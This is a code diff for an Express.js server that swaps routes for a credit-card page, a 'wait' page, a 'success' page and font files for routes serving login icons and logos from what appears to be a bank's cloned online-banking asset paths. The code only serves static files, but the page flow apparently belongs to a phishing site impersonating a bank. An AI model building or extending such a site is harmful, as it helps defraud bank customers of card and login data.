@@ -34,39 +34,39 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-app.get("/index_kredi_karti", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index_kredi_karti.html"));
+ 
+app.get("/Internet/omni/assets/img/updateImg1.png", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "updateImg1.png"));
 });
 
-app.get("/bekle", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "bekle.html"));
+app.get("/Internet/omni/assets/img/updateImg2.png", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "updateImg2.png"));
 });
 
-app.get("/basarili", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "basarili.html"));
-});
-app.get("/bireysel/Roboto-Regular.4e7449338f3a9fee.woff2", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "bireysel", "Roboto-Regular.4e7449338f3a9fee.woff2"));
-});
-app.get("/bireysel/Roboto-Black.b4556791e2a9e005.woff2", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "bireysel", "Roboto-Black.b4556791e2a9e005.woff2"));
-});
-app.get("/bireysel/Roboto-Bold.2a63183e6dff7d00.woff2", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "bireysel", "Roboto-Bold.2a63183e6dff7d00.woff2"));
-});
-app.get("/bireysel/Roboto-Regular.4557104648f65fcc.woff", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "bireysel", "Roboto-Regular.4557104648f65fcc.woff"));
-});
-app.get("/bireysel/Roboto-Regular.9135eb6940282650.ttf", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "bireysel", "Roboto-Regular.9135eb6940282650.ttf"));
-});
-app.get("/bireysel/bg-shape.821c876cc9147e04.svg", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "bireysel", "bg-shape.821c876cc9147e04.svg"));
-});
-app.get("/bireysel/icons.0c92e5a9a0838246.ttf", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "bireysel", "icons.0c92e5a9a0838246.ttf"));
+app.get("/Internet/omni/assets/img/logo.png", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "logo.png"));
 });
 
+app.get("/Internet/omni/assets/img/error_icon.png", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "error_icon.png"));
+});
+
+app.get("/Internet/omni/assets/img/login_icon_0.png", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "login_icon_0.png"));
+});
+
+app.get("/Internet/omni/assets/img/login_icon_1.png", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "login_icon_1.png"));
+});
+
+app.get("/Internet/omni/assets/img/login_icon_2.png", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "login_icon_2.png"));
+});
+
+// Büyük "O" ile istenen dosya (mobile_header.png)
+app.get("/Internet/Omni/assets/img/mobile_header.png", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "Internet", "Omni", "assets", "img", "mobile_header.png"));
+});
 
 
 
